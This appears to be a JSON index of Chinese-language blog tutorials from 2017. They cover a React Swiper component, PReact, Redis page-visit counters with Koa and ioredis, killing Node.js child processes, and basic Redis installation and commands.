constructor(props) &#123; super(props); this.props.options = Object.assign(&#123; pagination: '.swiper-pagination', &#125;, this.props.options); this.slicelist = this.props.children.map((item, index) =&gt; ( &lt;div className='swiper-slide' key=&#123;`swiper-slide-$&#123;Math.random()&#125;`&#125;&gt; &#123;item&#125; &lt;/div&gt; )); &#125; // 清理工作 componentWillUnmount() &#123; this.swiper.destroy(true, true); this.swiper = null; &#125; componentDidMount() &#123; let &#123; options, swiperIsInitialized &#125; = this.props; this.swiper = new Swiper(this.root, options); this.props.swiperIsInitialized(this.swiper); &#125; // 必须返回 false，此时 DOM 是由外部操作，不需要 VDOM shouldComponentUpdate(nextProps, nextState) &#123; if (typeof nextProps.activeIndex === 'number') &#123; this.swiper.slideTo(nextProps.activeIndex); &#125; return false; &#125; render() &#123; const &#123; options, swiperIsInitialized, pagination, ...other &#125; = this.props; return ( &lt;div className=\"swiper-container\" &#123;...other&#125; ref=&#123;r =&gt; this.root = r&#125;&gt; &lt;div className=\"swiper-wrapper\"&gt;&#123; this.slicelist &#125;&lt;/div&gt; &#123;!!pagination &amp;&amp; &lt;div class=\"swiper-pagination\"&gt;&lt;/div&gt;&#125; &lt;/div&gt; ); &#125;&#125; 使用： 1234567891011&lt;Swiper style=&#123;&#123; height: '240px', backgroundColor: '#3bf' &#125;&#125; pagination=&#123;true&#125; &gt; &lt;div className='slide'&gt;Slide 1&lt;/div&gt; &lt;div className='slide'&gt;Slide 2&lt;/div&gt; &lt;div className='slide'&gt;Slide 3&lt;/div&gt;&lt;/Swiper&gt; 1234567891011.slide &#123; display: flex; justify-content: center; align-items: center; width: 100%; height: 100%; color: #fff; font-size: 32px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;&#125; 效果： 使用 Swiper 实现仿美团外卖 App 首页滑动图核心代码，就这些，数据需要自己抓。 1234567891011121314&lt;Swiper options=&#123;&#123; loop: true, autoplay: 3000, autoplayDisableOnInteraction: false &#125;&#125; pagination=&#123;true&#125; style=&#123;&#123; height: '200px' &#125;&#125;&gt; &#123;data.map((item, index) =&gt; ( &lt;div class=&#123;ha.swiperitem&#125; &gt; &lt;img src=&#123;item.url&#125; /&gt; &lt;/div&gt; ))&#125;&lt;/Swiper&gt; 数据： 12345678910[ &#123;\"url\": \"http://p1.meituan.net/wmbanner/dc71f543a60348bfbf1de4e903fb7d1a120817.jpg\"&#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/83ad3d5305450fdcb2ba852903ef567c65741.jpg\" &#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/5f244fddce346cde27c56b7cbae7b23276373.jpg\" &#125;, &#123;\"url\": \"http://p1.meituan.net/wmbanner/98622bea56ca7ab11e816d8cadc03e1792073.jpg\" &#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/a6cdf2049606d25d6cb9bf1e026368ab109911.jpg\"&#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/8e97e266f2a4f7c603201ab2dd2376be115423.jpg\"&#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/17d8be2751cd5cd7175e97d371f0588d126446.jpg\"&#125;, &#123;\"url\": \"http://p0.meituan.net/wmbanner/0196b09cf521f6d03c5428066775c55f120272.jpg\"&#125;] 效果： 参考资料 https://preactjs.com/guide/external-dom-mutations http://www.swiper.com.cn/demo/index.html","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"最轻的 Virtual DOM 实现：PReact","slug":"React/PReact/最轻的 Virtual DOM 实现：PReact","date":"2017-06-25T02:52:12.000Z","updated":"2021-06-15T06:10:52.874Z","comments":true,"path":"/stories/2017/06/React/PReact/最轻的 Virtual DOM 实现：PReact/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/React/PReact/最轻的 Virtual DOM 实现：PReact/","excerpt":"PReact PReact是一个 类似 React 的框架，有着几乎与 React 一样的 API。PReact在 DOM 上实现了一个可能是最薄的一层虚拟 DOM 实现，号称是最轻的 Virtual DOM 实现，在 gzip 下只有 3k 的大小。 这么说，PReact算是一个 Min React，非常适合在移动端上使用。 关于 PReact 的渲染性能，参考：服务端渲染性能大乱斗：Vue, React, Preact, Rax, Marko","text":"PReact PReact是一个 类似 React 的框架，有着几乎与 React 一样的 API。PReact在 DOM 上实现了一个可能是最薄的一层虚拟 DOM 实现，号称是最轻的 Virtual DOM 实现，在 gzip 下只有 3k 的大小。 这么说，PReact算是一个 Min React，非常适合在移动端上使用。 关于 PReact 的渲染性能，参考：服务端渲染性能大乱斗：Vue, React, Preact, Rax, Marko preact-cli使用搭手架工具preact-cli来快速搭建开发环境。 安装： 1npm install --save preact PReact 几乎与 React API 差不多，同样都是用 JSX。 初始化项目：官方只提供一个创建 PWA 的搭手架。 123456789101112# once and you're good:npm install -g preact-cli # 搭手架，这是构建 PWA 应用的# create a new project:preact create my-great-app # 等几分钟后，如果没有停止信息，那就可以关闭了cd my-great-app# start a live-reload/HMR dev server:npm start# go to production:npm run build 最后你创建的是一个 PWA 应用。 nwbnwb也是也是搭手架，不过它支持，丰富的搭建。用于 React，Preact，Inferno 和 vanilla JS 应用程序的工具包，React 库和其他 npm 模块，无需配置（直到您需要）。 安装： 1npm install -g nwb@next 初始化项目： 1nwb new preact-app my-app 路由在 PReact 里使用的路由是preact-router。 简单使用： 12345678910111213import Router from 'preact-router';import &#123; h, render &#125; from 'preact';/** @jsx h */const Main = () =&gt; ( &lt;Router&gt; &lt;Home path=\"/\" /&gt; &lt;About path=\"/about\" /&gt; &lt;Search path=\"/search/:query\" /&gt; &lt;/Router&gt;);render(&lt;Main /&gt;, document.body); 参考资料 https://preactjs.com/ https://github.com/developit/preact-cli https://github.com/developit/preact-router https://github.com/insin/nwb","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Redis 应用：评估是否需要缓存 — 页面访问计数器","slug":"Redis/Redis 应用：评估是否需要缓存 — 页面访问计数器","date":"2017-06-20T15:09:03.000Z","updated":"2021-06-15T06:10:52.889Z","comments":true,"path":"/stories/2017/06/Redis/Redis 应用：评估是否需要缓存 — 页面访问计数器/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/Redis/Redis 应用：评估是否需要缓存 — 页面访问计数器/","excerpt":"前言下面，我将打算使用Redis来对 Web 页面访问进行计数，从而得到一个页面访问监控系统（Demo），来评估某个页面是否需要使用缓存技术。 计数器： 通过记录各个页面的被访问次数，我们可以根据基本的访问技术信息来决定如何缓存页面，或者是是否需要缓存页面。 通过在一段时间内持续地记录这些信息，我们可以注意到流量的递增或渐增的情况，来预测何时需要对服务器进行升级，从而防止系统因为负荷超载而下线。 同时，还可以记录数据库的读/写操作次数，在部署集群，复制集时非常有用。","text":"前言下面，我将打算使用Redis来对 Web 页面访问进行计数，从而得到一个页面访问监控系统（Demo），来评估某个页面是否需要使用缓存技术。 计数器： 通过记录各个页面的被访问次数，我们可以根据基本的访问技术信息来决定如何缓存页面，或者是是否需要缓存页面。 通过在一段时间内持续地记录这些信息，我们可以注意到流量的递增或渐增的情况，来预测何时需要对服务器进行升级，从而防止系统因为负荷超载而下线。 同时，还可以记录数据库的读/写操作次数，在部署集群，复制集时非常有用。 为了不影响页面的性能，把计数器存储到Redis里是再好不过了。持续的收集信息，记录着页面的访问频率，让我们实时的监控 Web 的性能波动。 数据存储对于计数器信息的数据存储，我使用的是一个ZSET（有序集合）来储存。 使用一个有序集合来存储页面在每个 10 秒（或者其他）的时间片（time slice）之内的点击数量。其中有序集合的每个成员是某个时间片的开始时间，而分数对应的值是存储了页面在该时间片之内访问的次数。比如：以 30 秒为时间片间隔，计算某个 url 的页面访问次数： 12345671. 使用 有序集合 结构进行储存2. key 命名： count:时间片:url count:30:/home &lt;--- /home 的计数器 1497969116 | 45 &lt;--- 某个时间点的访问次数 1497969146 | 120 1497969176 | 26 那么，看看如何使用 Nodejs 实现这个功能： 12345678910111213// 时间片间隔const SPACE = 10;// 更新数据function updateCount(redis, url, count = 1, now = Date.now() / 1000) &#123; // 计算出时间片的开始时间： | 0 是使 float 转为 int const pnow = (now / SPACE | 0) * SPACE; // zincrby 是一个累加函数，对于不存在的会创建，并从 0 开始累加 count return redis.zincrby(`count:$&#123;SPACE&#125;:$&#123;url&#125;`, count, pnow).then(res =&gt; &#123; console.log(res); &#125;);&#125; updateCount会根据 url 来记录 url 的访问次数。updateCount有 4 个参数，第一个参数是 redis 对象，第二个参数是 url 地址，第三个参数是累加的值，默认为 1，第四个参数为当前时间戳。 HTTP 服务下面首先搭建一个 Web 服务，编写几个简单的路由。然后，自定义一个计数器中间件，让页面被访问时，去调用updateCount函数来计数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * 使用 redis 实现的页面访问计数器 * * 比如：以 30 秒为时间片间隔，计算某个 url 的页面访问次数 * * 1. 使用 Hash 结构进行储存 * 2. key 命名： count:时间片:url * * count:30:/home * * 1497969116 | 45 * 1497969146 | 120 * 1497969176 | 26 */const colors = require('colors');const Redis = require('ioredis');const Koa = require('koa');const Router = require('koa-router');const logger = require('koa-logger');const app = new Koa();const router = new Router();const redis = new Redis();const navgator = ` &lt;style&gt; h1, h2, h3 &#123; font-weight: normal; &#125; a &#123; text-decoration: none; color: #f50; &#125; a:hover &#123; color: #3bf; &#125; &lt;/style&gt; &lt;h1&gt; &lt;a href='/'&gt;index&lt;/a&gt; &lt;a href='/home'&gt;home&lt;/a&gt; &lt;a href='/about'&gt;about&lt;/a&gt; &lt;/h1&gt;`;router .get('/', async ctx =&gt; &#123; ctx.body = navgator; ctx.body += '&lt;h2&gt;index&lt;/h2&gt;'; &#125;) .get('/home', async ctx =&gt; &#123; ctx.body = navgator; ctx.body += '&lt;h2&gt;home&lt;/h2&gt;'; &#125;) .get('/about', async ctx =&gt; &#123; ctx.body = navgator; ctx.body += '&lt;h2&gt;about&lt;/h2&gt;'; &#125;);// 计数器 中间件const count = () =&gt; (ctx, next) =&gt; &#123; updateCount(redis, ctx.url); // &lt;--- 更新计数器 next();&#125;;app .use(logger()) .use(count()) // &lt;--- 使用中间件 .use(router.routes()) .use(router.allowedMethods())app.listen(3000, () =&gt; &#123; console.log('\\n\\tServer run in 3000\\n'.green);&#125;); 此时，打开 127.0.0.1:3000 可以看到： 这样，通过不段的访问页面来模拟测试： 查看效果模拟测试一段时间后，把对应的计数器读取出来查看。 12345678910111213141516const colors = require('colors');const Redis = require('ioredis');const redis = new Redis();const SPACE = 10;redis.zrange(`count:$&#123;SPACE&#125;:/`, [0, -1, 'withscores']).then(res =&gt; &#123; console.log('/\\n'.green, res);&#125;);redis.zrange(`count:$&#123;SPACE&#125;:/home`, [0, -1, 'withscores']).then(res =&gt; &#123; console.log('/home\\n'.green, res);&#125;);redis.zrange(`count:$&#123;SPACE&#125;:/about`, [0, -1, 'withscores']).then(res =&gt; &#123; console.log('/about\\n'.green, res);&#125;); 得到以下计数器数据： 123456789101112131415161718192021222324252627/[ '1498008790', '1', '1498008820', '1', '1498008940', '2', '1498008950', '4', '1498008680', '5', '1498008780', '13']/home[ '1498009030', '1', '1498008790', '2', '1498008950', '7', '1498008990', '9', '1498009010', '11', '1498009020', '21', '1498008960', '28', '1498009000', '28', '1498008970', '30']/about[ '1498008790', '1', '1498008950', '3', '1498008960', '3'] 可以看出，很明显的 home 页面访问量与访问率都很多，这样就可以考虑对 home 页面进行缓存处理。 说明：这些访问量是模拟测试出来的（刚才我不断的按 F5 刷新，( ^_^ )/），实际上的数据看实际情况。 多时间片计数器上面只添加了一个计数器（时间片为 10 秒），不过还可以添加多个时间片的计数器。 把updateCount代码修改成： 1234567891011121314151617181920212223242526272829// 时间片间隔const SPACE = [ 10, // 10 秒 30, // 30 秒 60, // 1 分钟 5 * 60, // 5 分钟 60 * 60, // 1 小时 24 * 60 * 60 // 1 天];// 更新数据function updateCount(redis, url, count = 1, now = Date.now() / 1000) &#123; const test = (_SPACE) =&gt; &#123; // | 0 是使 float 转为 int const pnow = (now / _SPACE | 0) * _SPACE; // zincrby 是一个累加函数，对于不存在的 key 会自动创建，并从 0 开始加 count return redis.zincrby(`count:$&#123;SPACE&#125;:$&#123;url&#125;`, count, pnow).then(res =&gt; &#123; console.log(res); &#125;); &#125;; // 异步处理 return Promise.all(SPACE.map(i =&gt; test(i))) .then(resall =&gt; &#123; console.log(resall); &#125;);&#125; 清理旧数据当程序运行久了之后，就会产生一定的旧数据，而这些旧数据通常都不需要留着使用，这时应该有一个自动清理旧数据的函数来处理，防止无用数据的积累。 使用sort与zrem命令，让有序集合保持只有 1000 个成员。 12345678910111213141516// 只保留 1000 个成员async function removeCount(redis, url, rank = 1000) &#123; const key = `count:$&#123;SPACE&#125;:$&#123;url&#125;`; // 成员个数 const number = await redis.zcard(key); // 不足 1000 个 if (number &lt;= rank) return; // 按照时间点进行排序，旧 -&gt; 新 const list = await redis.sort(key); // 删除旧数据 return redis.zrem(key, list.slice(0, list.length - rank));&#125; 可视化数据使用一些可视化框架来显示数据，比如：ECharts 更多计数器对于大多数数据来说，页面访问量计数器只是冰山一角，我们还可以对更多的数据进行统计，比如： 页面访问的时间 （折线图） 页面访问的响应时间 （饼形图，50ms, 100ms, 200ms 等响应时间比例）[可以评估服务器性能] 页面访问浏览器类型（饼形图） 等等，这些都可以用计数器来统计。","categories":[{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/categories/Redis/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"Nodejs ioredis 的使用","slug":"Redis/Nodejs ioredis 的使用","date":"2017-06-11T14:01:04.000Z","updated":"2021-06-15T06:10:52.889Z","comments":true,"path":"/stories/2017/06/Redis/Nodejs ioredis 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/Redis/Nodejs ioredis 的使用/","excerpt":"ioredisioredis 是 Nodejs 的一个Redis模块，有着与Redis一模一样的 API 操作。 它有几个特点： 全功能。它支持 Cluster，Sentinel，Pipelining 以及 Lua 脚本和 Pub / Sub（在二进制消息的支持下）。 高性能。 令人愉快的 API 它适用于 Node 回调和 Promise。","text":"ioredisioredis 是 Nodejs 的一个Redis模块，有着与Redis一模一样的 API 操作。 它有几个特点： 全功能。它支持 Cluster，Sentinel，Pipelining 以及 Lua 脚本和 Pub / Sub（在二进制消息的支持下）。 高性能。 令人愉快的 API 它适用于 Node 回调和 Promise。 转换命令参数和回复。 透明键前缀。 抽象 Lua 脚本，允许您定义自定义命令。 支持二进制数据。 支持 TLS。 支持离线队列和准备检查。 支持 ES6 类型，如 Map 和 Set。 支持 GEO 命令（Redis 3.2 Unstable）。 复杂的错误处理策略。 安装： 1npm install --save ioredis 基本使用下面介绍，它的基本使用，其实使用起来非常简单。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const Redis = require('ioredis');// 默认是 http://127.0.0.1:6379， 0 号数据库const redis = new Redis();// 计算时间const timing = async (name = 'test', cb) =&gt; &#123; console.time(name); typeof cb === 'function' &amp;&amp; await cb(); console.timeEnd(name);&#125;// settiming('set', _ =&gt; &#123; redis.set('foo', 'bar'); redis.get('foo').then(res =&gt; &#123; console.log(res); &#125;);&#125;);// deltiming('del', _ =&gt; &#123; redis.del('foo').then(res =&gt; &#123; console.log(res); &#125;);&#125;);// sadd [set 集合]timing('sadd', _ =&gt; &#123; redis.sadd('seta', 1, 3, 5, 7).then(res =&gt; console.log(res)); redis.sadd('setb', [1, 3, 5, 7]).then(res =&gt; console.log(res));&#125;);// lpush [list 列表]timing('lpush', _ =&gt; &#123; redis.lpush('list', [1, 2, 3]).then(res =&gt; console.log(res)); redis.lrange('list', [0, -1]).then(res =&gt; console.log(res));&#125;);// 选择数据库 [序号]timing('select', _ =&gt; &#123; // 选择 1 号数据库，然后查询 1 号数据库的 keys redis.select(1).then(res =&gt; &#123; redis.set('name', 'xiaoming'); redis.keys('*').then(res =&gt; console.log(res)); &#125;)&#125;);// 事务timing('basic', async () =&gt; &#123; redis.multi().set('a', 1).set('b', 2).exec();&#125;);// 管道redis.pipeline().get('a').get('b').exec().then(res =&gt; &#123; console.log(res);&#125;); 输出： 1234567891011set: 9.000msdel: 9.557mssadd: 10.212mslpush: 10.100msbar10031[ 'name' ] 可以看出，在 redis 命令行里怎样使用，在这里就怎样使用，API 基本是一致。 连接 Redis连接Redis，默认是连接到http://127.0.0.1:6379。 1234567891011121314new Redis() // Connect to 127.0.0.1:6379new Redis(6380) // 127.0.0.1:6380new Redis(6379, '192.168.1.1') // 192.168.1.1:6379new Redis('/tmp/redis.sock')new Redis(&#123; port: 6379, // Redis port host: '127.0.0.1', // Redis host family: 4, // 4 (IPv4) or 6 (IPv6) password: 'auth', db: 0, // 数据库号&#125;)// 使用 redis 协议new Redis('redis://:authpassword@127.0.0.1:6380/4') 发布与订阅以下是发布/订阅 API 的简单示例。以下程序打开两个客户端连接。它使用一个连接订阅一个频道，并与另一个发布到该频道： 123456789101112131415161718192021222324252627282930timing('sub/pub', _ =&gt; &#123; // 发布 const pub = new Redis(); // 订阅 news 与 music redis.subscribe('news', 'music', (err, count) =&gt; &#123; // 现在我们订阅了'新闻'和'音乐'通道 // count 表示我们当前订阅的频道数 pub.publish('news', 'Hello world!'); pub.publish('music', 'Hello again!'); &#125;); // 监听 message 事件 redis.on('message', (channel, message) =&gt; &#123; // 接收信息世界，你好！从频道新闻 // 再次收到消息，你好！从声道音乐 console.log('Receive message %s from channel %s', message, channel); // 把 news 退订了 redis.unsubscribe('news'); // redis.unsubscribe('news', 'music'); &#125;); // 还有一个名为'messageBuffer'的事件，它与'message'相同 // 它返回缓冲区而不是字符串 redis.on('messageBuffer', (channel, message) =&gt; &#123; // Both `channel` and `message` are buffers. &#125;);&#125;); 相应的有： 12345// 订阅与给定模式相匹配的所有频道redis.psubscribe('pat?ern', function (err, count) &#123;&#125;);redis.punsubscribe(...arg);redis.on('pmessage', function (pattern, channel, message) &#123;&#125;);redis.on('pmessageBuffer', function (pattern, channel, message) &#123;&#125;); 当客户端发出 subscribe 或 psubscribe 时，该连接被置于“订户”模式。在这一点上，只有修改订阅集的命令是有效的。（其他命令无效）订阅集为空时，连接将恢复为常规模式。 处理二进制数据参考下面代码： 1redis.set('buf', new Buffer('buf')); 参考资料 https://github.com/luin/ioredis","categories":[{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/categories/Redis/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"Nodejs 关于子进程创建与杀死","slug":"Nodejs/Nodejs 关于子进程创建与杀死","date":"2017-06-10T13:49:28.000Z","updated":"2021-06-15T06:10:52.838Z","comments":true,"path":"/stories/2017/06/Nodejs/Nodejs 关于子进程创建与杀死/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/Nodejs/Nodejs 关于子进程创建与杀死/","excerpt":"前言最近在做一些模块是遇到需要使用 Nodejs 来调用外部的程序来输出结果，下面记录一下一些解决方法。 一般的做法是创建一个子进程，这样的话就可以拿到子进程的 PID，后面就好办了。 比如：需要用到 python 处理一些数据，使用 Nodejs 创建一个子进程来运行 python，最后从标准输出流读取 python 输出的结果数据。","text":"前言最近在做一些模块是遇到需要使用 Nodejs 来调用外部的程序来输出结果，下面记录一下一些解决方法。 一般的做法是创建一个子进程，这样的话就可以拿到子进程的 PID，后面就好办了。 比如：需要用到 python 处理一些数据，使用 Nodejs 创建一个子进程来运行 python，最后从标准输出流读取 python 输出的结果数据。 子进程Nodejs 里提供child_process模块来创建子进程。 提供了几个 API 来创建不同类型的线程： child_process.exec(): 创建一个 shell 并在 shell 上运行一个命令，当完成时会传入 stdout 和 stderr 到一个回调。 child_process.execFile(): 和 child_process.exec() 类似，除了它直接创建命令，且不用先创建一个 shell。 child_process.fork(): 创建一个新的 Node.js 进程，并通过建立一个允许父进程和子进程之间相互发送信息的 IPC 通讯通道来调用一个指定的模块。 child_process.execSync(): child_process.exec() 的一个同步版本，它会阻塞 Node.js 的事件循环。 child_process.execFileSync(): child_process.execFile() 的一个同步版本，它会阻塞 Node.js 的事件循环。 它们都一致的返回一个 ChildProcess 对象。 ChildProcessChildProcess 类的实例是 EventEmitter，代表创建的子进程。 重要的事件： close: 当子进程的 stdio 流被关闭时会触发 close 事件。 disconnect: 在父进程中调用 child.disconnect() 或在子进程中调用 process.disconnect() 后会触发 disconnect 事件。 error: 发生错误的触发 error 事件。 exit: 子进程结束后会触发 ‘exit’ 事件。 message: 父进程通信消息事件。 重要属性： child.connected: 可以用来判定是否与父进程还连接着。 child.pid: PID child.send(message[, sendHandle[, options]][, callback]): 当父进程和子进程之间建立了一个 IPC 通道时，可用于发送消息到子进程。 exec 创建子进程exec是比较常用的 API。比如，我想使用 ffmpeg，那么相当于在 shell 中使用 ffmpeg -i test.flv output.mp4。 123456789101112131415161718192021const cp = require('child_process');const command = 'ffmpeg -i test.flv output.mp4';const ffmpegcp = cp.exec(command, (err, stdout, stderr) =&gt; &#123; console.log(stdout);&#125;).on('close', (code, signal) =&gt; &#123; console.log('close');&#125;).on('error', err =&gt; &#123; console.log('error');&#125;).on('exit', (code, signal) =&gt; &#123; console.log('exit');&#125;).on('disconnet', () =&gt; &#123; console.log('disconnet');&#125;).on('message', (msg, sandHeader, socket) =&gt; &#123; console.log('message');&#125;) 杀死子进程在使用kill杀死进程的时候，发现一个问题。实际上exec会创建两个进程，一个是 shell 进程，另个是 shell 命令里的进程，他们的 PID 相差一。 也就是要杀死的是两个进程号： pid pid + 1 1234567891011121314151617181920const shell = require('shelljs');const cp = require('child_process');const command = 'ffmpeg -i test.flv output.mp4';const ffmpegcp = cp.exec(command, (err, stdout, stderr) =&gt; &#123; console.log(stdout);&#125;);// pid 是 cp.exec 的进程 pidconsole.log(ffmpegcp.pid);setTimeout(_ =&gt; &#123; // 杀死 pid ffmpegcp.kill('SIGKILL'); console.log('10 秒后，杀进程啦'); // 杀死 pid + 1，pid + 1 是 ffmpeg 的进程 pid shell.exec(`kill -2 $&#123;ffmpegcp.pid + 1&#125;`); // 退出主进程 process.exit(1);&#125;, 1000 * 10); 下面两个子线程，PID 为： 3072, 3073 相差一。 参考资料 http://nodejs.cn/api/child_process.html","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Redis 知识整理","slug":"Redis/Redis 知识整理","date":"2017-06-08T13:23:49.000Z","updated":"2021-06-15T06:10:52.889Z","comments":true,"path":"/stories/2017/06/Redis/Redis 知识整理/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/Redis/Redis 知识整理/","excerpt":"应用场景 缓存 任务队列 网站统计 数据过期处理 分布式集群架构中的 session 分离","text":"应用场景 缓存 任务队列 网站统计 数据过期处理 分布式集群架构中的 session 分离 安装在 CentOS 上安装。 12345wget http://download.redis.io/redis-stable.tar.gztar xvzf redis-stable.tar.gzcd redis-stablemakemake test 在 make 成功以后，会在 src 目录下多出一些可执行文件： redis-server，redis-cli 等等。然后把它们插入到 /usr/local/redis 里。 1make PREFIX=/usr/local/redis install 再把 redis.conf 复制过去 1cp redis.conf /usr/local/redis/ 然后新建目录，存放配置文件 12345mkdir /etc/redismkdir /var/redismkdir /var/redis/logmkdir /var/redis/runmkdir /var/redis/6379 修改 redis.conf 123456daemonize yespidfile /var/redis/run/redis_6379.pidlogfile /var/redis/log/redis_6379.logdir /var/redis/6379# The filename where to dump the DBdbfilename dump.rdb 最后启动服务： 1redis-server ./redis.conf 查看是否启动： 1ps -ef | grep redis 关闭： 1234# 使用 kill 有点不安全kill pid -2# 或者/usr/local/redis/bin redis-cli shutdown 数据类型Redis 支持 5 种数据类型。 string（字符串） hash（哈希） list（列表） set（集合） zset(sorted set：有序集合) 注意：redis 的命名冲突的问题。 string（字符串）string 是 Redis 最基本的类型，你可以理解成与 Memcached 一模一样的类型，一个 key 对应一个 value。string 类型是二进制安全的。意思是 Redis 的 string 可以包含任何数据。比如 jpg 图片或者序列化的对象。string 类型是 Redis 最基本的数据类型，一个键最大能存储 512MB。 12345678910111213141516# 设置set name \"lizhooh\"# 获取get name## lizhoohset number 1# 对类数字字符串加一incr number# 对类数字字符串减一decr number# 返回字符串长度strlen name hash（哈希）Redis hash 是一个键名对集合。Redis hash 是一个 string 类型的 field 和 value 的映射表，hash 特别适合用于存储对象。 123456789101112131415161718# 存hset lizhooh name lizhihonghmset lizhooh name lizhihong age 21# 取hget lizhooh namehmget lizhooh name## lizhihong# 全部 keyhgetall lizhooh## 1) \"name\"## 2) \"lizhihong\"## 3) \"age\"## 4) \"21\"# 删除某个 keyhdel lizhooh list（列表）Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。 1234567891011121314151617181920212223242526272829# 向 list 里增加一项 redislpush list redis# 再增加一项lpush list mongodb# 多项增加lpush list mysql sql# 从右边加入rpush list sqlSevver# 左弹，右弹lpop listrpop list# 查看内容, 取 list 0 - 10 项lrange list 0 10# 列表个数llen list# 当且仅当列表存在是才插入lpushx arr a# 删除全部del list# 删除某一项，删除 sql，也可以删除多个相同项， 0 是全部lrem list 1 sql set（集合）Redis 的 Set 是 string 类型的无序集合。Set 的元素是惟一的，增加相同的第二次无效。集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。 1234567891011121314151617181920# 增加一个元素sadd label html# 一次性增加多个sadd label html css javascript# 取成员(members)smembers label# 删除，删除 html csssrem label html css# 判定是否是 set 中的成员sismember label javascript# 集合成员数量scard label# 返回随机一个成员，下面返回 2 个srandmember label 2 zset(sorted set：有序集合)Redis zset 和 set 一样也是 string 类型元素的集合，且不允许重复的成员。不同的是每个元素都会关联一个 double 类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的，但分数(score)却可以重复。 12345678# 增加一个zadd tabel 1 html# 增加多个zadd tabel 1 html 1 css 1 javascript# 取成员 tabel 0 - 10 的范围zrangebyscore tabel 0 10 通用命令1234567891011121314151617181920212223# 查看 redis 中的所有 keykeys *# 查看某类keys a*# 判定是否存在 keyexists a# 重命名rename a newa# 设置数据过期时间，单位是秒expire newa 120# 输出过期时间ttl newa# 输出类型，在删除时，判定是什么类型，再用指定的语法删除。type newa# 把当前的 key 移动到另一个数据库里，移动到 1 号数据库move newa 1 Redis一个实例提供 16 个数据库，使用select（0 - 15）来选择数据库。 1select 1 Redis 发布订阅Redis 发布订阅 (pub/sub) 是一种消息通信模式：发送者 (pub) 发送消息，订阅者 (sub) 接收消息。Redis 客户端可以订阅任意数量的频道。 12345678910111213# 订阅频道 (sub)subscribe redischat# (pub) 此时，重新开一个 redis-cli，推送一个消息publish redischat \"AAA\"# 在刚才的频道里输出了1) \"message\"2) \"redischat\"3) \"AAA\"# 退出订阅unsubscribe redischat 匹配频道：发布与订阅：Redis Psubscribe 命令订阅一个或多个符合给定模式的频道。 每个模式以 作为匹配符，比如 it 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)。news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等). Redis 持久化Redis 支持的两种持久化方式：RDB 与 AOF。 RDB （快照）RDB 是一个默认的行为：Redis 会按照一定的时间来，持久化数据把内存保存到磁盘里。一般在 redis.conf 里的 save 里设置。 123save 900 1 # 表示 900 秒内，如果有 1 个数据变化，就触发 RDBsave 300 10 # 表示 300 秒内，如果有 10 个数据变化，就触发 RDBsave 60 10000 # 表示 60 秒内，如果有 10000 个数据变化，就触发 RDB AOF （追加文件）AOF 是把当前的所有命令操作都记录在日志文件里，当 redis 崩毁重启后会去读取 AOF，重复之前的动作来达到数据的一致性。要使用 AOF，要在 redis.conf 里打开 1234567appendonly yes # 开启appendfilename \"appendonly.aof\" # 文件位置# 几个触发 AOF 策略# appendfsync always # 每修改一次，触发 AOFappendfsync everysec # 每秒，触发 AOF# appendfsync no # 关闭 AOF 数据备份与恢复Redis save 命令用于创建当前数据库的备份。该命令将在 redis 对应目录中创建 dump.rdb 文件。 在 redis.conf 里有一个：dir ./rdb 是用来设置 rdb 文件的位置。 1save 如果需要恢复数据，只需将备份文件 (dump.rdb) 移动到 redis 安装目录并启动服务即可。获取 redis 目录可以使用 CONFIG 命令（它会读取 rdb 来恢复数据）： 1config get dir 